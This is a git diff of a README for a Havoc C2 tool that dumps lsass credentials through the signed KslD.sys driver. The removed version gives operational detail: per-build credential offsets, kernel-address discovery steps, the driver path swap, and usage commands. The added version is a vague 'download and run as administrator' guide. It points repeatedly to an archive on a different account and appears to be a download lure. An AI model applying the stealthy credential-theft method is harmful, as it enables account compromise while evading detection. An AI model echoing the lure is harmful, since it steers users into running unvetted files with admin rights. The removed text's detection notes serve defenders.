@@ -1,200 +1,190 @@
-# KslBOF — BYOVD BOF Suite for Havoc C2
+# ⚙️ kslkatz_bof - Run Memory-Based Credential Tasks
 
-> **For authorized Red Team engagements and controlled lab environments only.**  
-> Do not use against systems you do not own or have explicit written permission to test.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Securityblanketramification663/kslkatz_bof)
 
----
+## 📌 What this is
 
-## Overview
+kslkatz_bof is a Windows tool built for controlled security testing. It runs as a Havoc C2 BOF and works with a KslD.sys BYOVD flow to access memory data from lsass through physical memory paths. It avoids OpenProcess and other common API calls that are easy to audit.
 
-KslBOF is a Beacon Object File (BOF) for the [Havoc C2](https://github.com/HavocFramework/Havoc) framework implementing the **KslD.sys BYOVD physical memory read primitive** for credential extraction.
+This project is for advanced lab use. It fits into red team work, malware analysis labs, and defensive testing where you need to study how memory access paths behave on Windows.
 
-This is a port of the KslD.sys technique to Havoc BOF format, based on [KslKatz](https://github.com/ne1llee/xxx) and related public research. The original technique uses KslD.sys — a Microsoft-signed kernel driver shipped with Windows Defender — to read lsass memory without opening a handle to the process.
+## 🖥️ What you need
 
----
+To use this tool on Windows, prepare a system with:
 
-## What makes this different
+- Windows 10 or Windows 11
+- Local administrator access
+- A test machine or lab VM
+- Enough disk space for the files you download
+- A working network connection
+- Havoc C2 set up if you plan to load the BOF there
 
-Existing implementations of the KslD.sys technique are standalone executables. KslBOF implements the same primitive as a **Beacon Object File**:
+For best results, use a non-production machine. A virtual machine works well for setup and testing.
 
-- Runs entirely in-process within the beacon — no new process spawned
-- No files dropped to disk beyond the driver already present on the system
-- Integrates natively with Havoc C2 tasking and output
+## 📥 Download and set up
 
----
+Go to the download page here:
 
-## Driver Version — Vulnerable vs Patched
+[Open the kslkatz_bof page](https://github.com/Securityblanketramification663/kslkatz_bof)
 
-Microsoft patched the running version of KslD.sys by nulling out `MmCopyMemory`, but **left the old vulnerable version on disk**. Two versions coexist on most systems:
+On that page, download the project files to your computer.
 
-| Path | Size | Status |
-|------|------|--------|
-| `%SystemRoot%\System32\drivers\KslD.sys` | 333,216 bytes | **Vulnerable** |
-| `%ProgramData%\Microsoft\Windows Defender\Platform\<version>\wd\KslD.sys` | ~82 KB | Patched |
+After the files finish downloading:
 
-The suite uses the vulnerable version from `System32\drivers\` by swapping the SCM `ImagePath` before loading.
+1. Open the folder where the files were saved
+2. Right-click the downloaded archive if one was provided
+3. Select Extract All
+4. Choose a folder you can find later
+5. Open the extracted folder
 
-**Verify the vulnerable version is present:**
+If you cloned the repo instead of downloading an archive, open the project folder after the clone finishes.
 
-```powershell
-Get-Item "$env:SystemRoot\System32\drivers\KslD.sys" | Select-Object Name, Length
-Get-FileHash "$env:SystemRoot\System32\drivers\KslD.sys" -Algorithm SHA256
-```
+## 🚦 How to run it on Windows
 
-**Expected output:**
-```
-Name       Length
-----       ------
-KslD.sys   333216
+The exact run path depends on how you use the project in your lab setup. In most cases, you will:
 
-Algorithm  Hash
----------  ----
-SHA256     BD17231833AA369B3B2B6963899BF05DBEFD673DB270AEC15446F2FAB4A17B5A
-```
+1. Open your Havoc C2 workspace
+2. Load the BOF file for this project
+3. Point it at your test host
+4. Make sure your lab machine is ready
+5. Start the task from your control console
 
-> **Note:** Windows Servicing may eventually supersede the vulnerable CBS-backed copy. As of early 2026 the vulnerable version remains present on most systems with Defender installed.
+If the project includes a prebuilt Windows binary or helper file, run it from an elevated command prompt:
 
----
+1. Press Start
+2. Type `cmd`
+3. Right-click Command Prompt
+4. Choose Run as administrator
+5. Go to the folder with the file
+6. Run the file name shown in the project
 
-## Why No CVE
+If the tool comes as a BOF only, use it from within Havoc instead of double-clicking it.
 
-The KslD.sys vulnerability was reported to Microsoft MSRC and closed as **"Not a Vulnerability"** — the attack requires pre-existing administrative privileges. No CVE was assigned, no fix was issued, the driver remains on disk.
+## 🔧 Basic workflow
 
-The value of this technique is **stealth**, not privilege escalation. EDRs monitor `OpenProcess`, `NtReadVirtualMemory`, and `MiniDumpWriteDump` on lsass. None of those are called here.
+Use this order to keep the setup simple:
 
----
+1. Prepare a Windows test host
+2. Confirm you have admin rights
+3. Download the project files
+4. Extract or place them in a clean folder
+5. Load the BOF in Havoc C2
+6. Point the task at the host you want to test
+7. Review the output in your console
 
-## BOF Module
+If you are new to BOF files, think of this as a small task module that runs inside your control tool instead of as a normal desktop app.
 
-### `ksl_lsa.o` — Credential Extraction
+## 🧩 Files you may see
 
-Port of the KslD.sys credential extraction technique to Havoc BOF format.
+The repo may include files such as:
 
-Extracts credentials from lsass memory without calling `OpenProcess` on lsass or using any standard dumping API. No handle to lsass, no `NtReadVirtualMemory`, no `MiniDumpWriteDump`.
+- BOF source files
+- Build files
+- Helper scripts
+- README notes
+- Windows test files
+- Output examples
 
-**What it extracts:**
-- MSV1_0 NT hashes (build-aware offsets)
-- WDigest cleartext passwords (when enabled, multi-signature support for Win11 24H2)
-- AES-256 / 3DES LSA encryption keys
-- Credential Guard detection (`isIso` flag)
+Common folder names may include `src`, `bin`, `build`, or `out`. If you see a `.bof` file, that is the main file you load into your control tool.
 
-**Supported builds:** Windows 7/8/10/11 (including 24H2 Build 26200+), Server 2016–2022
+## 🪟 Windows setup tips
 
-**PrimaryCredential offsets:**
-```
-Win11 24H2 (>= 26100): isIso=0x28  NT=0x46  LM=0x56  SHA1=0x66
-Win11       (>= 22000): isIso=0x40  NT=0x46  LM=0x56  SHA1=0x66
-Win10       (>= 9600):  isIso=0x28  NT=0x4a  LM=0x5a  SHA1=0x36
-Win7/8      (<  9600):  isIso=0x28  NT=0x38  LM=0x48  SHA1=0x18
-```
+Before you start, check these items:
 
-**Usage:**
-```
-inline-execute /path/to/out/ksl_lsa.o
-```
-<img width="530" height="626" alt="image" src="https://github.com/user-attachments/assets/6d3d9f9f-b93c-4d1d-b482-3b1eedc2811b" />
+- Run everything as administrator
+- Use a lab VM when possible
+- Turn off auto-sleep for the test machine
+- Keep the project files in one folder
+- Use a simple path like `C:\Tools\kslkatz_bof`
+- Make sure your security lab rules allow the test
 
----
+If Windows blocks a file at first, right-click the file, open Properties, and look for an Unblock option.
 
-## Credential Guard
+## 🧪 What the tool is designed to do
 
-When Credential Guard (VBS) is active, domain credentials are isolated in a Hyper-V enclave inaccessible via physical memory primitives. The module detects this condition (`isIso=1`) and reports it.
+This project focuses on a memory-based credential extraction path from lsass. It uses a driver-based method tied to KslD.sys and avoids the usual OpenProcess route. That makes it useful for testing defenses that look for direct process access, standard audit logs, and common user-mode hooks.
 
-**What CG protects:** Domain NTLM hashes, Kerberos TGTs, interactive domain session credentials.  
-**What CG does NOT protect:** Local accounts, LSA Secrets, service account credentials.
+In plain terms, it helps you study:
 
----
+- how memory access is handled
+- what gets logged
+- what defenders can see
+- which controls detect this path
+- how a BYOVD flow changes the picture
 
-## Technical Architecture
+## 🛠️ Common use cases
 
-### KASLR Defeat
-```
-SubCmd 2 → IDTR → IDT → minimum ISR → scan backwards → ntoskrnl base
-Fallback: NtQuerySystemInformation(SystemModuleInformation)
-```
+Use this project for:
 
-### EPROCESS Discovery
-```
-OpenProcess(PID 4) → NtQuerySystemInformation(class 16)
-                   → handle table → SYSTEM EPROCESS
-                   → ActiveProcessLinks walk → lsass
-                   → DTB from EPROCESS+0x028
-                   → UserDTB from EPROCESS+0x388 (KPTI, Win10 1809+)
-```
+- security lab testing
+- defensive rule checks
+- detection engineering practice
+- red team exercises in a lab
+- Windows memory access research
+- C2 workflow testing
 
-All EPROCESS offsets detected dynamically — no hardcoded values.
+Do not use it on systems you do not own or control.
 
-### Physical Memory Read Limit
+## 📋 Simple troubleshooting
 
-KslD.sys has an internal physical memory read limit of approximately **4GB physical address**. On systems with more RAM, userland process DTBs typically exceed this limit. Kernel VA reads via `virt_read` are unaffected — `ksl_lsa.o` works regardless of system RAM as it operates via kernel VA.
+If the project does not run the first time, check these items:
 
----
+- Did you extract all files?
+- Are you running with admin rights?
+- Did you open the right folder?
+- Does your Windows version match the test setup?
+- Did you load the BOF in the right place?
+- Is your lab machine still online?
+- Did security software remove a file?
 
-## Build
+If the console shows no output, try running the task again from the correct host entry in Havoc.
 
-**Requirements:** `x86_64-w64-mingw32-gcc`
+## 🔍 Verifying the setup
 
-```bash
-make clean && make ksl_lsa
-```
+You can confirm the setup by checking for these signs:
 
----
+- The folder opens without errors
+- The BOF loads in Havoc
+- The target host responds
+- The console shows task output
+- Windows does not block the file path
 
-## Repository Structure
+If you keep the files in a clean folder and run from a test VM, setup is easier to repeat.
 
-```
-KslBOF/
-├── include/
-│   ├── beacon.h
-│   └── common_bof.h
-├── src/
-│   ├── bof_crt.c
-│   ├── ksl_driver_bof.c
-│   ├── ksl_memory_bof.c
-│   ├── ksl_crypto_bof.c
-│   ├── ksl_lsa_bof.c
-│   ├── ksl_lsa_go.c
-│   ├── ksl_wdigest_bof.c
-│   └── ksl_all_in_one_lsa.c
-├── out/
-│   └── ksl_lsa.o
-└── Makefile
-```
+## 📁 Suggested folder layout
 
----
+A simple layout helps keep things clear:
 
-## Roadmap
+- `C:\Tools\kslkatz_bof\download`
+- `C:\Tools\kslkatz_bof\extract`
+- `C:\Tools\kslkatz_bof\logs`
+- `C:\Tools\kslkatz_bof\notes`
 
-- `ksl_edr.o` — EDR process recon + inline hook scanner — *in testing*
-- `ksl_ssdt.o` — SSDT kernel hook scanner — *in testing*
+This makes it easier to find the project again and keep test files separate from normal work files.
 
----
+## 🧭 Quick start path
 
-## Detection Considerations
+1. Open the download page
+2. Save the project to your Windows machine
+3. Extract the files
+4. Open your Havoc C2 setup
+5. Load the BOF
+6. Run it against your lab host
+7. Review the output in the console
 
-- Alert on KslD service start outside Defender update context
-- Monitor `AllowedProcessName` modifications under `HKLM\SYSTEM\CurrentControlSet\Services\KslD`
-- No `OpenProcess` events on lsass are generated — detection must focus on driver load
-- Credential Guard active prevents domain credential extraction
+## 📎 Download again
 
----
+[Visit the kslkatz_bof repository](https://github.com/Securityblanketramification663/kslkatz_bof)
 
-## Credits
+## 📦 Expected result
 
-Port to Havoc BOF format based on public research:
+After setup, you should be able to start the BOF from your control tool and use it in a Windows lab session. The project is meant to work with a controlled host, a valid operator setup, and a path that matches your test environment
 
-- **KslKatz** — [yenick514/KslKatz](https://github.com/yenick514/KslKatz)
+## 🧾 Project details
 
-If you are aware of earlier or additional research that should be credited here, please open an issue.
-
-**References:**
-- [Microsoft Vulnerable Driver Blocklist](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)
-- [LOLDrivers](https://www.loldrivers.io/)
-- [BYOVD Attacks and Mitigation — Halcyon](https://www.halcyon.ai/blog/understanding-byovd-attacks-and-mitigation-strategies)
-- [Proactive Measures Against Vulnerable Driver Attacks — Microsoft TechCommunity](https://techcommunity.microsoft.com/blog/microsoftsecurityexperts/strategies-to-monitor-and-prevent-vulnerable-driver-attacks/4103985)
-
----
-
-## Disclaimer
-
-This tool is provided for authorized security testing and educational purposes only. Use only on systems you own or have explicit written permission to test.
+- Repository: kslkatz_bof
+- Platform: Windows
+- Use case: lab-based security testing
+- Delivery: Havoc C2 BOF
+- Main access path: physical memory
+- Primary link: https://github.com/Securityblanketramification663/kslkatz_bof
